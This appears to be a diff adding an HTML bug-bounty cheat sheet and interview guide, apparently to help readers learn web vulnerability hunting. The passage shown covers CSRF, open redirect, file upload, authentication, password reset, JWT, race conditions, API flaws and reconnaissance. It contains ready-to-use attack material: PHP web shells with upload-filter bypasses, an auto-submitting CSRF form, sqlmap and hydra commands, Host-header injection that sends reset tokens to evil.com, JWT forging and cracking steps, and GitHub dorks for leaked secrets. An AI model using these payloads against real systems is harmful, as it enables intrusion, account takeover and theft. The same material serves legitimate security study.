+<span class="comment"># Header injection</span>
+<span class="comment"># In User-Agent or X-Forwarded-For:</span>
+1' AND SLEEP(5)--
+
+<span class="comment"># SQLMap</span>
+sqlmap -r request.txt --dbs --batch --random-agent --level 5 --risk 3
+sqlmap -u "https://target.com?id=1" --dbs --batch
+sqlmap -u "https://target.com" --header="X-Forwarded-For: 1*" --dbs</pre>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining</div>
+        <ul>
+          <li>SQLi → extract credentials → login as admin → access admin functions</li>
+          <li>SQLi → MySQL <code>INTO OUTFILE</code> → write web shell → RCE</li>
+          <li>SQLi → read <code>/etc/passwd</code> via <code>LOAD_FILE()</code> → sensitive data disclosure</li>
+          <li>SQLi → extract session tokens from DB → session hijacking → ATO</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"SQL injection is when attacker-controlled data is interpreted as SQL code rather than data because the application builds queries using string concatenation. The fix is parameterized queries. You find it by injecting single quotes and observing errors or behavior changes, then confirm with boolean or time-based payloads. The most critical form chains SQLi to write a web shell using MySQL's SELECT INTO OUTFILE, giving full server compromise."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 05. CSRF ==================== -->
+  <div class="section" id="csrf">
+    <div class="section-header">
+      <span class="icon">&#x1F503;</span>
+      <h2>05. CSRF — Cross-Site Request Forgery</h2>
+      <span class="vuln-tag medium">MEDIUM</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>CSRF tricks a logged-in user's browser into sending a forged request to a web app, performing an action without the user's consent. The browser automatically sends cookies with every request to a domain — CSRF exploits this behavior.</p>
+        <p style="margin-top: 8px;"><em>"I make you unknowingly send a request that changes your password on Bank.com while you're visiting my evil site."</em></p>
+      </div>
+
+      <div class="block theory">
+        <div class="block-title">Why This Happens</div>
+        <ul>
+          <li>Web apps rely on cookies for authentication. Browsers auto-send cookies.</li>
+          <li>If no CSRF token validates that the form came from the legitimate site, any site can forge the request.</li>
+          <li>Fix: CSRF tokens (random, secret, tied to session), SameSite cookie attribute, Origin header checking.</li>
+        </ul>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find</div>
+        <ol>
+          <li>Look for state-changing actions: password change, email change, account delete, transfer money, add admin.</li>
+          <li>Check if there is a CSRF token in the request. If not — potential CSRF.</li>
+          <li>If there is a token: try removing it, try using an old token, try using a token from your account on victim's action.</li>
+          <li>Check if SameSite cookie attribute is set (SameSite=Strict or Lax protects, None does not).</li>
+          <li>Check if Origin/Referer header is validated server-side.</li>
+          <li>Generate PoC using Burp Suite → Right click request → Engagement tools → Generate CSRF PoC</li>
+        </ol>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">PoC Template</div>
+<pre>&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="https://target.com/change-password" method="POST"&gt;
+      &lt;input type="hidden" name="new_password" value="hacked123"&gt;
+      &lt;input type="hidden" name="confirm_password" value="hacked123"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+<span class="comment"># CSRF token bypass attempts</span>
+<span class="comment"># 1. Remove token entirely</span>
+<span class="comment"># 2. Set token to empty string</span>
+<span class="comment"># 3. Use token from another session</span>
+<span class="comment"># 4. Change token length (some apps check length not value)</span></pre>
+      </div>
+
+      <div class="block bypass">
+        <div class="block-title">Bypass Techniques</div>
+        <ul>
+          <li>If app checks <code>Referer</code> header: try sending request without Referer (<code>Referrer-Policy: no-referrer</code> in PoC page)</li>
+          <li>If app validates Referer: try <code>https://target.com.evil.com/</code> or <code>https://evil.com?ref=https://target.com</code></li>
+          <li>CSRF in JSON: some apps accept both JSON and form. Send as form: <code>application/x-www-form-urlencoded</code> instead of JSON.</li>
+          <li>Self-XSS + CSRF: use CSRF to trigger self-XSS on victim, turning it into exploitable XSS.</li>
+        </ul>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining</div>
+        <ul>
+          <li>CSRF → change email → reset password to email you control → Account Takeover</li>
+          <li>CSRF → add attacker as admin → privilege escalation</li>
+          <li>XSS + CSRF → XSS steals CSRF token → use it to perform CSRF (bypasses token protection)</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"CSRF exploits the browser's automatic cookie sending behavior. When a user visits an attacker's page, it submits a forged form to a target site where the victim is logged in — the browser sends the session cookie automatically, so the server thinks it's a legitimate request. Prevention requires unpredictable CSRF tokens or the SameSite cookie attribute. The most impactful CSRF chains email change with password reset to achieve full account takeover."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 06. OPEN REDIRECT ==================== -->
+  <div class="section" id="open-redirect">
+    <div class="section-header">
+      <span class="icon">&#x27A1;&#xFE0F;</span>
+      <h2>06. Open Redirect</h2>
+      <span class="vuln-tag medium">MEDIUM</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>An open redirect is when an application redirects users to a URL controlled by the attacker without validating the destination. By itself it's low severity, but it becomes critical when chained.</p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find</div>
+        <ol>
+          <li>Look for params: <code>redirect=</code>, <code>next=</code>, <code>url=</code>, <code>return=</code>, <code>goto=</code>, <code>target=</code>, <code>redir=</code></li>
+          <li>Try: <code>?next=https://evil.com</code></li>
+          <li>If blocked, try: <code>?next=//evil.com</code>, <code>?next=/\evil.com</code>, <code>?next=https:evil.com</code></li>
+          <li>Check after login redirect, logout redirect, and OAuth callback redirect_uri</li>
+        </ol>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads</div>
+<pre>https://target.com/login?next=https://evil.com
+https://target.com/login?next=//evil.com
+https://target.com/login?next=/\evil.com
+https://target.com/login?next=https://evil.com%2F@target.com
+https://target.com/login?next=javascript:alert(1)  <span class="comment"># → XSS</span>
+https://target.com/login?next=%09Jav%09ascript:alert(1)</pre>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining — This Is Where It Gets Critical</div>
+        <ul>
+          <li>Open redirect → phishing (looks like legit login page → steal credentials)</li>
+          <li>Open redirect in OAuth → steal authorization code → account takeover</li>
+          <li>Open redirect → SSRF (redirect server to internal IP via SSRF target)</li>
+          <li>Open redirect in <code>redirect_uri</code> → OAuth token theft → ATO</li>
+          <li>Open redirect + javascript: scheme → Reflected XSS</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"Open redirect on its own is low severity but chains extremely well. The most critical chain is in OAuth flows — if the redirect_uri accepts an open redirect on the target domain, you can steal the authorization code by pointing it to your attacker server. This gives you full account takeover without any user credential exposure."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 07. FILE UPLOAD ==================== -->
+  <div class="section" id="file-upload">
+    <div class="section-header">
+      <span class="icon">&#x1F4C1;</span>
+      <h2>07. File Upload Vulnerabilities</h2>
+      <span class="vuln-tag critical">CRITICAL</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>File upload vulnerabilities occur when an application allows uploading files without properly validating the file type, content, or where it is stored. At worst, attacker uploads a web shell (PHP/JSP/ASP file) and achieves Remote Code Execution.</p>
+      </div>
+
+      <div class="block theory">
+        <div class="block-title">Why This Happens</div>
+        <ul>
+          <li>App validates file extension client-side only (easily bypassed).</li>
+          <li>App checks Content-Type header (attacker-controlled, easily faked).</li>
+          <li>App does magic bytes check but not content validation.</li>
+          <li>Uploaded file stored in web-accessible directory and executed by the server.</li>
+        </ul>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find</div>
+        <ol>
+          <li>Find every file upload feature in the app: profile photo, document upload, import feature, etc.</li>
+          <li>Try uploading a PHP file: <code>shell.php</code> with content <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
+          <li>If blocked by extension: try bypass techniques below.</li>
+          <li>Find where the file is stored. Try to browse to it. If you can access it, test if it executes.</li>
+          <li>Even if upload rejected, check if a partial processing happens (for polyglots).</li>
+        </ol>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads &amp; Bypass Techniques</div>
+<pre><span class="comment"># Basic web shell</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php echo shell_exec($_REQUEST['cmd']); ?&gt;
+
+<span class="comment"># Extension bypass attempts</span>
+shell.php
+shell.php5
+shell.php7
+shell.phtml
+shell.pHp
+shell.php.jpg
+shell.php%00.jpg     <span class="comment"># null byte (older PHP)</span>
+shell.php::$DATA     <span class="comment"># NTFS alternate data stream (Windows)</span>
+
+<span class="comment"># Content-Type bypass</span>
+<span class="comment"># Change in Burp: Content-Type: image/jpeg</span>
+<span class="comment"># But keep .php extension and PHP content</span>
+
+<span class="comment"># Magic bytes bypass (prepend GIF header to PHP)</span>
+GIF89a;&lt;?php system($_GET['cmd']); ?&gt;
+<span class="comment"># Save as shell.gif but server might still execute as PHP</span>
+
+<span class="comment"># SVG for XSS (if SVG allowed)</span>
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/&gt;
+
+<span class="comment"># ImageMagick exploit (stored XSS via image processing)</span>
+<span class="comment"># Upload specially crafted image that triggers XSS when thumbnailed</span>
+
+<span class="comment"># .htaccess upload (if apache)</span>
+AddType application/x-httpd-php .jpg
+<span class="comment"># Now .jpg files execute as PHP</span>
+
+<span class="comment"># Path traversal in filename</span>
+../../../var/www/html/shell.php</pre>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining</div>
+        <ul>
+          <li>File upload → web shell → RCE → read /etc/passwd, env vars, cloud credentials</li>
+          <li>SVG upload → Stored XSS → admin cookie theft → account takeover</li>
+          <li>File upload + path traversal → overwrite config files</li>
+          <li>ImageMagick RCE via crafted image → server compromise</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"File upload bugs range from XSS via SVG files to full RCE via web shell upload. The root cause is insufficient validation of file type and content, combined with storing files in web-executable directories. I look for extension-based bypasses — like changing .php to .php5 or .phtml — and Content-Type manipulation. The most impactful variant is uploading a PHP web shell that gets executed by Apache, giving interactive server access."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 08. AUTH BUGS ==================== -->
+  <div class="section" id="auth">
+    <div class="section-header">
+      <span class="icon">&#x1F510;</span>
+      <h2>08. Authentication Flaws</h2>
+      <span class="vuln-tag high">HIGH</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>Authentication flaws are weaknesses in how an application verifies who the user is. This includes weak password policies, missing rate limiting on login, bypassing login with manipulation, and broken 2FA implementation.</p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">Checklist — Auth Testing</div>
+        <ul>
+          <li>No rate limiting on login → brute force attack</li>
+          <li>No rate limiting on OTP → brute force OTP</li>
+          <li>OTP valid for too long (hours instead of minutes)</li>
+          <li>OTP works after it's been used (no invalidation)</li>
+          <li>OTP leaked in API response or in HTML source</li>
+          <li>2FA bypass: complete 2FA for your account, reuse the flow for victim's account</li>
+          <li>2FA bypass: manipulate <code>user_id</code> or <code>account_id</code> in the 2FA verification request</li>
+          <li>Default credentials: <code>admin:admin</code>, <code>root:root</code>, <code>admin:password</code></li>
+          <li>Response manipulation: <code>"success": false</code> → change to <code>true</code> in intercepted response</li>
+          <li>Account enumeration: different error messages for valid vs invalid username</li>
+          <li>Login via linked social account to bypass 2FA on main account</li>
+        </ul>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Key Test Scenarios</div>
+<pre><span class="comment"># Response manipulation bypass</span>
+<span class="comment"># Server returns: {"status": "failed", "2fa_required": true}</span>
+<span class="comment"># Change to: {"status": "success", "2fa_required": false}</span>
+
+<span class="comment"># Account takeover via invite reset</span>
+<span class="comment"># Some apps let you invite email → invited user sets password → ATO if token reused</span>
+
+<span class="comment"># Credential stuffing automation</span>
+hydra -L users.txt -P passwords.txt target.com http-post-form \
+  "/login:username=^USER^&password=^PASS^:F=Invalid"
+
+<span class="comment"># 2FA bypass via IDOR on verification endpoint</span>
+POST /verify-otp
+{"user_id": "victim_id", "otp": "123456"}  <span class="comment"># your valid OTP, victim's user_id</span></pre>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"Authentication flaws include missing rate limiting (enables brute force), OTP that can be guessed or reused, and 2FA implementations with IDOR in the verification endpoint — where you can verify your OTP against the victim's account ID. I always test for response manipulation where changing 'failed' to 'success' in the HTTP response bypasses the check entirely."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 09. PASSWORD RESET ==================== -->
+  <div class="section" id="password-reset">
+    <div class="section-header">
+      <span class="icon">&#x1F504;</span>
+      <h2>09. Password Reset Bugs</h2>
+      <span class="vuln-tag critical">CRITICAL</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>Password reset flows are high-value targets because a successful exploit almost always leads to full account takeover. Common flaws include token predictability, token not expiring, host header injection, and reset token leakage.</p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">Full Checklist</div>
+        <ul>
+          <li><strong>Host Header Injection:</strong> Reset link uses Host header to build URL. Inject your domain: <code>Host: evil.com</code> → victim gets reset link pointing to evil.com → you get the token.</li>
+          <li><strong>Token in Referer:</strong> After reset, if user clicks any link, the reset token leaks in the Referer header.</li>
+          <li><strong>Token not expiring:</strong> Can use a 24-hour-old token to reset password.</li>
+          <li><strong>Token not invalidated after use:</strong> Token can be reused multiple times.</li>
+          <li><strong>Token predictable:</strong> Based on timestamp or sequential — brute-forceable.</li>
+          <li><strong>Email parameter manipulation:</strong> <code>{"email": ["victim@victim.com", "attacker@attacker.com"]}</code> — some apps send token to both.</li>
+          <li><strong>No rate limit on token submission:</strong> Brute force the short token.</li>
+          <li><strong>Reset token in URL via GET:</strong> Token logged in server access logs, browser history, CDN logs.</li>
+        </ul>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads</div>
+<pre><span class="comment"># Host Header Injection in password reset</span>
+POST /forgot-password HTTP/1.1
+Host: evil.com    <span class="comment"># change legitimate host</span>
+Content-Type: application/json
+
+{"email": "victim@target.com"}
+
+<span class="comment"># Response: 200 OK</span>
+<span class="comment"># Victim gets email: "Reset your password at: https://evil.com/reset?token=abc123"</span>
+
+<span class="comment"># Email parameter array injection</span>
+{"email": ["victim@victim.com", "attacker@attacker.com"]}
+{"email": "victim@victim.com, attacker@attacker.com"}
+
+<span class="comment"># X-Forwarded-Host bypass (if Host header is filtered)</span>
+X-Forwarded-Host: evil.com
+X-Forwarded-Server: evil.com
+X-Host: evil.com</pre>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"Password reset bugs are critical because they lead directly to account takeover. The most impactful one is Host Header Injection — the app builds the reset link using the HTTP Host header, which the attacker can change to their own domain. The victim receives a legitimate-looking email but clicking the link sends the token to the attacker's server. I always test this by intercepting the forgot-password request and changing the Host header."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 10. JWT ==================== -->
+  <div class="section" id="jwt">
+    <div class="section-header">
+      <span class="icon">&#x1F3AB;</span>
+      <h2>10. JWT Attacks</h2>
+      <span class="vuln-tag critical">CRITICAL</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>JWT (JSON Web Token) is used to prove who you are. It has 3 parts: Header.Payload.Signature. If the signature verification is weak or skipped, an attacker can forge tokens to impersonate any user including admin.</p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">Attack Types — Must Know</div>
+        <ul>
+          <li><strong>None algorithm attack:</strong> Change <code>"alg": "HS256"</code> to <code>"alg": "none"</code> and remove signature. Some servers accept this.</li>
+          <li><strong>Algorithm confusion (RS256 → HS256):</strong> Server uses RS256 (asymmetric). Attacker changes to HS256 and signs with the PUBLIC key (which is known). Server verifies with public key as HMAC secret = accepts forged token.</li>
+          <li><strong>Weak secret brute force:</strong> If HS256 with weak secret like "secret" or "password". Use hashcat to crack.</li>
+          <li><strong>jwk header injection:</strong> Embed your own public key in the JWT header (<code>jwk</code> field), sign with matching private key.</li>
+          <li><strong>jku header injection:</strong> Point <code>jku</code> to your server hosting a malicious JWK Set.</li>
+          <li><strong>kid injection:</strong> <code>"kid": "../../dev/null"</code> or <code>"kid": "' UNION SELECT 'attacker_secret'--"</code></li>
+        </ul>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">Payloads</div>
+<pre><span class="comment"># Original JWT</span>
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicmFodWwifQ.signature
+
+<span class="comment"># None algorithm attack</span>
+<span class="comment"># Header: {"alg": "none"}</span>
+eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+<span class="comment"># Crack HS256 with hashcat</span>
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># Using jwt_tool</span>
+python3 jwt_tool.py TOKEN -X a    <span class="comment"># none algorithm</span>
+python3 jwt_tool.py TOKEN -X s    <span class="comment"># signature bypass</span>
+python3 jwt_tool.py TOKEN -C -d wordlist.txt   <span class="comment"># crack</span>
+
+<span class="comment"># Burp Extension: JWT Editor — for algorithm confusion attacks</span></pre>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"JWT attacks exploit weaknesses in token signature verification. The most critical is the algorithm confusion attack — the server uses RS256 but if you switch the header to HS256, the server might verify using the public key as an HMAC secret, which is known. This allows forging any token including admin. Another common one is the 'none' algorithm — setting alg to none and removing the signature, which vulnerable servers accept. I test these using jwt_tool or the Burp JWT Editor extension."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 11. RACE CONDITION ==================== -->
+  <div class="section" id="race">
+    <div class="section-header">
+      <span class="icon">&#x1F3C1;</span>
+      <h2>11. Race Conditions</h2>
+      <span class="vuln-tag high">HIGH</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>A race condition happens when two requests arrive at the same time and the server processes them simultaneously before updating state. This can allow using a coupon twice, redeeming gift cards multiple times, or making multiple purchases at once.</p>
+        <p style="margin-top: 8px;"><em>"Check-Then-Act without a lock: both requests check 'has coupon been used = false', both pass, both redeem it."</em></p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">How To Find and Exploit</div>
+        <ol>
+          <li>Look for one-time actions: use coupon, redeem gift card, use free trial, claim reward, rate limit (vote once).</li>
+          <li>In Burp, capture the request. Send to Repeater. Open multiple Repeater tabs.</li>
+          <li>Use Burp's "Send group in parallel" feature — sends all requests simultaneously.</li>
+          <li>Use Turbo Intruder for high-precision parallel attacks.</li>
+          <li>Check if any action succeeds more than once.</li>
+        </ol>
+<pre><span class="comment"># Turbo Intruder script for race condition</span>
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=True)
+    for i in range(30):
+        engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    if '200' in req.response:
+        table.add(req)</pre>
+      </div>
+
+      <div class="block chain">
+        <div class="block-title">Bug Chaining</div>
+        <ul>
+          <li>Race condition on coupon → use 100% off coupon 20 times → free purchases</li>
+          <li>Race condition on balance transfer → negative balance / duplicate transfer</li>
+          <li>Race condition on email OTP → bypass OTP rate limit</li>
+          <li>Race condition on account creation → create two accounts with same email</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"Race conditions exploit timing windows in state changes. When a server checks a condition and then acts on it without atomic locking, two simultaneous requests can both pass the check and both perform the action. I find them by identifying single-use operations and sending parallel requests using Burp's group send feature or Turbo Intruder. The most valuable finds are on payment flows and coupon redemption."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 12. BUSINESS LOGIC ==================== -->
+  <div class="section" id="biz-logic">
+    <div class="section-header">
+      <span class="icon">&#x1F9E0;</span>
+      <h2>12. Business Logic Vulnerabilities</h2>
+      <span class="vuln-tag high">HIGH</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>Business logic bugs are flaws in the design of an application's workflow. No SQL injection, no XSS — just the app doing the wrong thing when you use features in an unexpected way. Scanners cannot find these. Only manual testing and thinking like an attacker.</p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">Checklist — What To Test</div>
+        <ul>
+          <li>Negative quantity in cart → negative total → free money?</li>
+          <li>Apply discount then add more items (discount not recalculated)</li>
+          <li>Skip payment step (directly hit order confirmation endpoint)</li>
+          <li>Modify price in the request: <code>{"price": 0.01}</code></li>
+          <li>Order flow: can you skip steps? Go to step 5 without doing step 3?</li>
+          <li>Free trial: sign up, cancel, sign up again with same email</li>
+          <li>Quantity: what happens if you order 0 items? -1 items? 99999 items?</li>
+          <li>Permissions: can a viewer call an admin API endpoint?</li>
+          <li>Feature flags: access beta/restricted features by manipulating request</li>
+          <li>Forgot password: request reset for victim, then complete flow as them</li>
+        </ul>
+      </div>
+
+      <div class="block scenario">
+        <div class="block-title">Real Examples</div>
+        <ul>
+          <li><strong>Stripe (H1):</strong> User could pay using archived price by changing price ID in request — resulting in paying $0.</li>
+          <li><strong>Zomato (H1):</strong> Availing Zomato Gold by using random third-party wallet_id — free premium subscription.</li>
+          <li><strong>InDrive (H1):</strong> Rider can forcefully accept passenger's order by manipulating order_id — mass PII exposure.</li>
+        </ul>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"Business logic vulnerabilities are design flaws where the application does the wrong thing when features are used in unintended ways. Automated scanners miss these completely — they require understanding what the application is supposed to do, and then testing what happens when you do it differently. Classic examples are negative quantities in carts, skipping payment steps, or applying discounts in the wrong order to get items for free."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 13. API BUGS ==================== -->
+  <div class="section" id="api">
+    <div class="section-header">
+      <span class="icon">&#x1F517;</span>
+      <h2>13. API Vulnerabilities</h2>
+      <span class="vuln-tag high">HIGH</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block definition">
+        <div class="block-title">Simple Definition</div>
+        <p>APIs often have weaker security than web frontends because developers assume they won't be called directly. Key issues: broken auth, missing rate limiting, excessive data in responses, and BOLA (same as IDOR).</p>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">API Testing Checklist</div>
+        <ul>
+          <li>Find API endpoints: check JS files, mobile app, Swagger/OpenAPI docs, <code>/api/v1/</code>, <code>/api/v2/</code></li>
+          <li>Test unauthenticated access: remove auth header, try endpoints without token</li>
+          <li>Test v1 vs v2: newer version might have auth, older might not</li>
+          <li>Excessive data: does response return more fields than the frontend shows? (hidden fields)</li>
+          <li>Mass assignment: can you send extra fields in POST/PUT body to set role, verified, isAdmin?</li>
+          <li>BOLA: change IDs in API calls (same as IDOR)</li>
+          <li>HTTP method testing: app accepts GET but also POST/PUT/DELETE?</li>
+          <li>Check GraphQL: introspection enabled? Admin-only mutations accessible?</li>
+          <li>Rate limiting: is there any? On every endpoint?</li>
+        </ul>
+      </div>
+
+      <div class="block payload">
+        <div class="block-title">API Recon Commands</div>
+<pre><span class="comment"># Find API endpoints in JS files</span>
+waybackurls target.com | grep "/api/" | sort -u
+
+<span class="comment"># Check for Swagger docs</span>
+/swagger.json
+/api/swagger.json
+/v1/api-docs
+/openapi.json
+
+<span class="comment"># GraphQL introspection</span>
+{"query": "{ __schema { types { name } } }"}
+
+<span class="comment"># Test for mass assignment</span>
+POST /api/profile/update
+{"name": "Rahul", "role": "admin", "verified": true}
+
+<span class="comment"># Test unauthenticated access</span>
+curl -X GET https://api.target.com/v1/users/1 <span class="comment"># no auth header</span></pre>
+      </div>
+
+      <div class="block interview">
+        <div class="block-title">&#x1F3AF; Interview Answer</div>
+        <p>"API testing focuses on authorization issues at the object level (BOLA/IDOR), missing authentication on certain endpoints (especially old versions), excessive data exposure in responses, and mass assignment where you can set privileged fields by including them in the request body. I always check for API documentation endpoints like Swagger and test GraphQL introspection which can reveal all available queries and mutations."</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== 14. RECON ==================== -->
+  <div class="section" id="recon">
+    <div class="section-header">
+      <span class="icon">&#x1F50D;</span>
+      <h2>14. Recon Bible</h2>
+      <span class="vuln-tag medium">RECON</span>
+    </div>
+    <div class="section-body">
+
+      <div class="block steps">
+        <div class="block-title">Subdomain Enumeration</div>
+<pre><span class="comment"># Passive recon</span>
+subfinder -d target.com -o subs.txt
+amass enum -passive -d target.com -o subs.txt
+assetfinder --subs-only target.com >> subs.txt
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u >> subs.txt
+
+<span class="comment"># Check alive hosts</span>
+cat subs.txt | httpx -silent -threads 200 | tee alive.txt
+
+<span class="comment"># Port scan on alive</span>
+naabu -l alive.txt -p 80,443,8080,8443,3000,8888 -silent</pre>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">URL Discovery</div>
+<pre><span class="comment"># Get historical URLs</span>
+cat alive.txt | gau | anew all_urls.txt
+cat alive.txt | waybackurls | anew all_urls.txt
+cat alive.txt | katana -silent | anew all_urls.txt
+
+<span class="comment"># Filter for interesting params</span>
+cat all_urls.txt | gf xss > xss_params.txt
+cat all_urls.txt | gf sqli > sqli_params.txt
+cat all_urls.txt | gf ssrf > ssrf_params.txt
+cat all_urls.txt | gf redirect > redirect_params.txt
+cat all_urls.txt | gf lfi > lfi_params.txt</pre>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">GitHub Dorks</div>
+<pre>"target.com" api_key
+"target.com" password
+"target.com" secret
+"target.com" filename:.env
+"target.com" filename:config.php
+"target.com" filename:credentials
+"target.com" language:python password
+"target.com" db_password
+
+<span class="comment"># GitHub specific</span>
+org:targetorg filename:.env
+org:targetorg "internal" password</pre>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">Shodan / FOFA Dorks</div>
+<pre><span class="comment"># Shodan</span>
+ssl:"target.com" http.title:"Admin"
+ssl:"target.com" port:8080
+org:"Target Inc" product:"Apache Tomcat"
+org:"Target Inc" http.title:"GitLab"
+
+<span class="comment"># FOFA</span>
+domain="target.com" && title="admin"
+cert="target.com" && port="8443"</pre>
+      </div>
+
+      <div class="block steps">
+        <div class="block-title">JavaScript Analysis</div>
+<pre><span class="comment"># Extract all JS files</span>
+cat alive.txt | katana -jc -silent | grep ".js" | anew js_files.txt
+
+<span class="comment"># Find endpoints in JS</span>
+cat js_files.txt | xargs -I@ sh -c 'curl -s @ | grep -E "(api|endpoint|url|path)" | grep "/"'
+
+<span class="comment"># SecretFinder for API keys in JS</span>
+python3 SecretFinder.py -i https://target.com/main.js -o results.html
+
+<span class="comment"># LinkFinder for endpoints</span>
+python3 linkfinder.py -i https://target.com -d -o results.html</pre>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== QUICK REVISION ==================== -->
+  <div class="quick-ref" id="quick">
+    <h2>&#x26A1; L100 Quick Revision Guide</h2>
+    <p style="text-align: center; color: #8b949e; margin-bottom: 1.5rem; font-size: 0.9rem;">Last-minute revision — steps only, no theory</p>
+    <div class="quick-ref-grid">
+
+      <div class="quick-card">
+        <h4>SSRF Quick Steps</h4>
+        <ol>
+          <li>Find url/dest/link param</li>
+          <li>Send to Interactsh URL</li>
+          <li>Got callback = blind SSRF</li>
+          <li>Try 127.0.0.1/169.254.x</li>
+          <li>If blocked, use encoded IPs</li>
+          <li>Try open redirect chain</li>
+          <li>Exploit with SSRFmap/Gopherus</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>IDOR Quick Steps</h4>
+        <ol>
+          <li>Create 2 accounts A and B</li>
+          <li>A creates resource, note ID</li>
+          <li>B tries to access A's ID</li>
+          <li>Test GET, POST, PUT, DELETE</li>
+          <li>Check all ID types in body/URL</li>
+          <li>Look at API responses for IDs</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>XSS Quick Steps</h4>
+        <ol>
+          <li>Put unique string in all inputs</li>
+          <li>Check where it reflects</li>
+          <li>Identify HTML context</li>
+          <li>Craft payload for that context</li>
+          <li>Test filter bypasses</li>
+          <li>For DOM: audit JS files</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>SQLi Quick Steps</h4>
+        <ol>
+          <li>Try single quote in all params</li>
+          <li>Check for errors / behavior change</li>
+          <li>Boolean: AND 1=1 vs AND 1=2</li>
+          <li>Time: AND SLEEP(5)</li>
+          <li>Confirm with sqlmap</li>
+          <li>Dump databases</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>Password Reset Steps</h4>
+        <ol>
+          <li>Intercept forgot-password request</li>
+          <li>Change Host header to your domain</li>
+          <li>Check if victim email gets link to your domain</li>
+          <li>Also try email array injection</li>
+          <li>Check token expiry and reuse</li>
+        </ol>
+      </div>
+
+      <div class="quick-card">
+        <h4>JWT Attack Steps</h4>
+        <ol>
+          <li>Decode JWT at jwt.io</li>
+          <li>Try alg: none</li>
+          <li>If HS256: try to crack secret</li>
+          <li>If RS256: try algo confusion to HS256</li>
+          <li>Check jwk/jku/kid header injection</li>
+        </ol>
+      </div>
+
